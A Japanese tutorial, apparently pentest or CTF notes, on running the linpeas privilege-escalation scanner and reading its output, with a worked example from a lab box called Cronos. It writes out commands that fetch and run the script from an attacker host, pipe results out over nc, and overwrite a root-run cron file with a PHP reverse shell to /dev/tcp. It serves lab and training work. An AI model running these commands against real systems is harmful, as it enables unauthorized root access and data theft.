# linpeas 使用手順

---

## 1. 攻撃マシンで準備

### linpeas.sh をダウンロード

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

### HTTP サーバーを起動

```bash
python3 -m http.server 8080
```

---

## 2. 被害マシンへ転送

シェルを取得した後、被害マシン側で実行：

```bash
cd /tmp
wget http://<攻撃マシンIP>:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

wget が使えない場合の代替：

```bash
# curl
curl http://<攻撃マシンIP>:8080/linpeas.sh -o linpeas.sh

# fetch
fetch http://<攻撃マシンIP>:8080/linpeas.sh
```

---

## 3. 出力の読み方

linpeas は危険度を色で表示する。

| 色 | 意味 |
|---|---|
| 赤（太字） | 高確率で権限昇格に使える |
| 赤 | 注意が必要 |
| 黄色 | 確認推奨 |
| 緑 | 情報として参考 |

---

## 4. 注目するセクション

### Cron jobs

```
[+] Cron jobs
* * * * * root php /var/www/laravel/artisan schedule:run
```

root が定期実行しているスクリプトを確認する。

### Writable files

```
[+] Writable files outside user's home
/var/www/laravel/artisan
```

root が実行するファイルに書き込み権限があれば即 root につながる。

### sudo -l

```
[+] Sudo version
[+] We can sudo without password: /usr/bin/vim
```

パスワードなしで実行できるコマンドを確認する。

### SUID binaries

```
[+] SUID - Check easy privesc, exploits and write perms
/usr/bin/passwd
/usr/bin/sudo
/custom/binary   ← カスタムバイナリは特に注意
```

### Capabilities

```
[+] Capabilities
/usr/bin/python3 cap_setuid=ep   ← これがあれば即 root
```

---

## 5. 出力をファイルに保存する

出力が長いため、ファイルに保存して後から確認する方法が便利：

```bash
./linpeas.sh | tee /tmp/linpeas_output.txt
```

攻撃マシンで受け取る場合：

```bash
# 攻撃マシンで nc で待機
nc -lvnp 9999 > linpeas_output.txt

# 被害マシンから送信
./linpeas.sh | nc <攻撃マシンIP> 9999
```

---

## 6. Cronos での実例

linpeas を実行すると以下が赤くハイライトされる：

```
[+] Cron jobs
* * * * * root php /var/www/laravel/artisan schedule:run

[+] Writable files outside user's home
/var/www/laravel/artisan
```

この2点から攻略方針が決まる：

```bash
# artisan にリバースシェルを書き込む
echo "<?php exec('bash -c \"bash -i >& /dev/tcp/<攻撃マシンIP>/5555 0>&1\"'); ?>" > /var/www/laravel/artisan

# 攻撃マシンで待機
nc -lvnp 5555

# 1分以内に root シェルが取得できる
```


```bash
rm /tmp/linpeas.sh
```
